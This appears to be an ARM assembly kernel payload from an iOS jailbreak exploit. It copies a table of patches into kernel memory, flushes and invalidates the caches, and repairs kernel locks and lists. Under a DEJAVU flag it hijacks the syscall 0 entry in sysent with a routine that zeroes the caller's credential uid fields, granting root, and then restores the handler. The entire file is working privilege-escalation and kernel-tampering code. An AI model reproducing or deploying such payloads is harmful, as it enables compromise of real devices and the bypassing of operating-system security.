.syntax unified
.arm
start:
    ldr sp, [sp, #(0x18 - 0x70)]
    sub sp, #0x18

    adr r0, inspiring
    bl _IOLog

    #mov r8, #0; b end; foo

    adr r5, stuff
    ldr r8, count

pf_loop:
    ldm r5, {r0, r2}
    add r1, r5, #8
    bl _memcpy
    ldm r5, {r0, r1}
    mov r2, #0
    bl _flush_dcache
    ldm r5!, {r0, r1}
    add r5, r1
    mov r2, #0
    bl _invalidate_icache
    
    subs r8, #1
    bne pf_loop

end:
    bl _IOLockAlloc
    str r0, [r6, #0x2d8]
    str r8, [r6, #0x238]
    str r8, [r6, #0x2d4]
    # fix up linked lists
    add r0, r6, #0x218
    str r0, [r6, #0x21c]
    add r0, r6, #0x220
    str r0, [r6, #0x220]
    str r0, [r6, #0x224]

#ifdef DEJAVU
    ldr r0, sysent
    adr r1, syscall_0
    str r1, [r0, #0x4]
#endif

    pop {r8, r10, r11}
    pop {r4-r7, pc}

#ifdef DEJAVU
syscall_0:
    push {lr} 
    bl _proc_ucred
    mov r1, #0
    str r1, [r0, #0xc]
    ldr r0, [r0, #0x6c]
    cmp r0, #0
    strne r1, [r0, #8]
    ldr r0, sysent
    ldr r1, [r0, #0xc4]
    str r1, [r0, #0x4]
    pop {pc}
#endif

inspiring: .asciz "I exist!\n"
.align 2

sysent: .long 0
count: .long 0
stuff:
    
    #patch("sysent", 0, uint32_t, {find_int32(b_macho_segrange(binary, "__DATA"), 0x861000, true) + 4});
